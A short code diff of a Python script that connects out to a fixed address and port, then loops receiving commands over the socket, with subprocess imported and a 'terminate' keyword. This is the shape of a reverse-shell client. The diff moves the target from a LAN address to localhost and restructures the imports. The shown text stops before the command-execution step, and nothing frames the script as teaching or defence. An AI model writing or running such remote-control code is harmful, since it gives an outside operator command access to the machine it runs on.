@@ -1,10 +1,11 @@
 # -*- coding: utf-8 -*-
-import socket
+from socket import socket
 import subprocess
 
+
 def open_connection_to_server():
-    sck = socket.socket()
-    sck.connect(("192.168.1.3", 8080))
+    sck = socket()
+    sck.connect(("127.0.0.1", 8000))
     while True:
         cmd = sck.recv(1024)
         if "terminate" in cmd.decode():
